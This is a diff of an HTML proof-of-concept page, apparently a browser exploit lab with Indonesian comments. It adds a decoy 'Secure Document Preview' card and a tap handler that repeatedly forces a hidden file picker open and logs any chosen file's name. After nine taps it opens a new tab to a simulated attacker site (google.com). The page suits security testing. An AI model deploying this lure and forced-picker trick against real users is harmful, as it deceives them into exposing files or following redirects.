@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Advanced Picker & Redirection Lab</title>
+    <title>Preview Link & New Tab Exploit Lab</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -15,37 +15,40 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: flex-end;
+            justify-content: center;
             min-height: 90vh;
             cursor: pointer;
         }
         h1 { color: #ff5252; font-size: 18px; margin-bottom: 5px; }
+        .preview-card {
+            background: #1e1e1e; border: 1px solid #333; padding: 20px;
+            border-radius: 8px; max-width: 400px; width: 100%; text-align: left;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.5); margin-bottom: 20px;
+        }
+        .preview-title { font-size: 15px; font-weight: bold; color: #fff; margin-bottom: 8px; }
+        .preview-desc { font-size: 12px; color: #aaa; margin-bottom: 12px; }
+        .preview-link { color: #80cbc4; font-size: 12px; text-decoration: underline; }
         .info-box {
             background: #1e1e1e; border: 1px solid #333; padding: 10px;
-            border-radius: 6px; max-width: 500px; width: 100%; font-size: 11px;
-            color: #b0b0b0; margin-top: 15px; text-align: left; max-height: 150px; overflow-y: auto;
+            border-radius: 6px; max-width: 400px; width: 100%; font-size: 11px;
+            color: #b0b0b0; text-align: left; max-height: 120px; overflow-y: auto;
         }
         code { background: #2d2d2d; color: #ff8a80; padding: 2px 4px; border-radius: 3px; font-family: monospace; }
-        .interactive-zone { position: relative; margin-bottom: 20px; width: 100%; display: flex; flex-direction: column; align-items: center; }
-        .target-button {
-            background: #ff5252; color: white; border: none; padding: 12px 24px;
-            font-size: 14px; border-radius: 4px; cursor: pointer; font-weight: bold;
-        }
     </style>
 </head>
 <body>
 
-    <h1>🔴 High-Frequency Picker & Redirection Exploit Lab</h1>
-    <p style="font-size: 12px; color: #888;">Ketuk layar secara cepat untuk memicu file picker dan pengalihan otomatis.</p>
-
-    <div class="interactive-zone">
-        <!-- Input file tersembunyi yang dipanggil secara programatik via showPicker() -->
-        <input id="file-input" type="file" style="display:none;" />
-        <button class="target-button">Tap Area / Interact Here</button>
+    <div class="preview-card">
+        <div class="preview-title">📄 Secure Document Preview</div>
+        <div class="preview-desc">Klik atau ketuk di sekitar kartu ini untuk memuat pratinjau dokumen rahasia.</div>
+        <div class="preview-link" id="fake-link">https://secure-docs.internal/view?file=confidential.pdf</div>
     </div>
 
+    <!-- Input file tersembunyi untuk memicu file picker -->
+    <input id="file-input" type="file" style="display:none;" />
+
     <div class="info-box" id="log-box">
-        <strong>Status Log:</strong> Menunggu interaksi sentuh (*pointerdown*)...
+        <strong>Status Log:</strong> Menunggu interaksi...
     </div>
 
 <script>
@@ -58,35 +61,32 @@
 
     let clickCount = 0;
     const fileInput = document.getElementById('file-input');
-    const targetThreshold = 9; // Jumlah ketukan cepat yang dibutuhkan untuk memicu eksploitasi
+    const targetThreshold = 9;
 
-    // Menangkap perubahan pada file input (jika file berhasil dipilih/diakses)
+    // Menangkap file yang berhasil ditarik via picker
     fileInput.addEventListener('change', (e) => {
         if (e.target.files.length > 0) {
             const fileName = e.target.files[0].name;
-            appendLog(`<span style="color: #4CAF50;">[Success] File terdeteksi & diakses: <b>${fileName}</b></span>`);
+            appendLog(`<span style="color: #4CAF50;">[Captured] File terbaca: <b>${fileName}</b></span>`);
         }
     });
 
     document.body.addEventListener('pointerdown', (e) => {
         clickCount++;
-        appendLog(`Pointer down terdeteksi (Hitungan: ${clickCount}/${targetThreshold})`);
+        appendLog(`Touch event ${clickCount}/${targetThreshold}`);
 
         try {
-            // Memaksa pemanggilan showPicker() pada elemen file
+            // Memaksa pemanggilan showPicker() secara programatik
             fileInput.showPicker();
-        } catch (err) {
-            // Mengabaikan error DOM exception jika belum memenuhi syarat aktivasi murni secara normal
-        }
+        } catch (err) {}
 
         if (clickCount >= targetThreshold) {
-            appendLog(`<span style="color: #ff8a80;">[Exploit Triggered] Batas ketukan tercapai. Memproses eksfiltrasi & pengalihan...</span>`);
+            appendLog(`<span style="color: #ff8a80;">[Exploit Triggered] Membuka tab baru ke server attacker...</span>`);
             
-            // Jeda singkat sebelum dialihkan ke domain penyerang (simulasi diarahkan ke google.com)
+            // Membuka halaman penyerang di tab baru (menggunakan google.com sebagai contoh simulasi)
             setTimeout(() => {
-                appendLog(`[Redirecting] Mengalihkan ke halaman attacker/eksternal...`);
-                window.location.href = "https://www.google.com";
-            }, 1200);
+                window.open("https://www.google.com", "_blank");
+            }, 500);
 
             clickCount = 0;
         }
